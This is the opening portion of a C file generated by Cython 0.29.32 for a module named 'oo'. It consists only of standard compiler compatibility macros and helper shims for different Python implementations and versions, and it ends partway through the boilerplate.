/* Generated by Cython 0.29.32 */

/* BEGIN: Cython Metadata
{
    "distutils": {
        "name": "oo",
        "sources": [
            "/storage/emulated/0/oo.py"
        ]
    },
    "module_name": "oo"
}
END: Cython Metadata */

#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_32"
#define CYTHON_HEX_VERSION 0x001D20F0
#define CYTHON_FUTURE_DIVISION 0
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC (PYPY_VERSION_HEX >= 0x07030900)
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if defined(PyUnicode_IS_READY)
  #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                              0 : _PyUnicode_Ready((PyObject *)(op)))
  #else
  #define __Pyx_PyUnicode_READY(op)       (0)
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if defined(PyUnicode_IS_READY) && defined(PyUnicode_GET_SIZE)
  #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
  #endif
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
